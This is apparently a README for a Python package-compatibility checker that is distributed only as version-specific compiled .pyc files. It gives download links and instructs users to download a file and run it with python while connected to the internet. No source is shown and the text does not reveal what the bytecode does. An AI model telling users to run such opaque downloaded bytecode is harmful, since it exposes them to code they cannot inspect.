# 📦 Python Package Checker v1.1.0

Effortlessly detect version conflicts between `tensorflow`, `keras`, `protobuf`, and other core Python packages across different Python versions.

> **Author**: [NexxaDev on GitHub](https://github.com/nexxadev)  
> 🔧 Passionate Coder & Robotic Hobbyist  
> 🌐 Website: [nexxadev.ct.ws](https://nexxadev.ct.ws)  

---

## 🚀 About the Project

This tool allows you to quickly check package compatibility for different Python versions using compiled `.pyc` files. It's ideal for developers managing machine learning or deep learning environments across systems.

Compiled `.pyc` files are available for **Python 3.7** to **Python 3.13**.

---

## 📦 Available `.pyc` Downloads

> Click below to download the version-specific compiled `.pyc` file:

| Python Version | Download |
|----------------|----------|
| Python 3.7.x   | [pkg_chk_3_7.pyc](https://github.com/nexxadev/py-pkg-checker/releases/download/v1.1.0/pkg_chk_3_7.pyc) |
| Python 3.8.x   | [pkg_chk_3_8.pyc](https://github.com/nexxadev/py-pkg-checker/releases/download/v1.1.0/pkg_chk_3_8.pyc) |
| Python 3.9.x   | [pkg_chk_3_9.pyc](https://github.com/nexxadev/py-pkg-checker/releases/download/v1.1.0/pkg_chk_3_9.pyc) |
| Python 3.10.x  | [pkg_chk_3_10.pyc](https://github.com/nexxadev/py-pkg-checker/releases/download/v1.1.0/pkg_chk_3_10.pyc) |
| Python 3.11.x  | [pkg_chk_3_11.pyc](https://github.com/nexxadev/py-pkg-checker/releases/download/v1.1.0/pkg_chk_3_11.pyc) |
| Python 3.12.x  | [pkg_chk_3_12.pyc](https://github.com/nexxadev/py-pkg-checker/releases/download/v1.1.0/pkg_chk_3_12.pyc) |
| Python 3.13.x  | [pkg_chk_3_13.pyc](https://github.com/nexxadev/py-pkg-checker/releases/download/v1.1.0/pkg_chk_3_13.pyc) |

---

## 🔗 Release Information

- **Version**: v1.1.0  
- **Tag**: [v1.1.0](https://github.com/nexxadev/py-pkg-checker/releases/tag/v1.1.0)  

---

## 📖 Usage Guide

> 💡 Make sure Python is installed and internet is ON

### 🔧 Step-by-step

1. **Check your Python version**:
   ```bash
   python --version
   ```
   Example output: `Python 3.11.5` → download the `pkg_chk_3_11.pyc` file.

2. **Download the matching .pyc file**  
   Choose the file that matches your Python version from the Downloads section above.

3. **Place the file in your working directory**  
   Move the downloaded `.pyc` file into the directory where you want to run the checker.

4. **Ensure you're connected to the Internet**  
   An internet connection is required for checking compatibility via the PyPI index.

5. **Run the checker using Python**  
   Open your terminal or command prompt in the same directory and run:
   ```bash
   python pkg_chk_3_11.pyc
   ```
   🔄 Replace `pkg_chk_3_11.pyc` with the version-appropriate filename you downloaded.
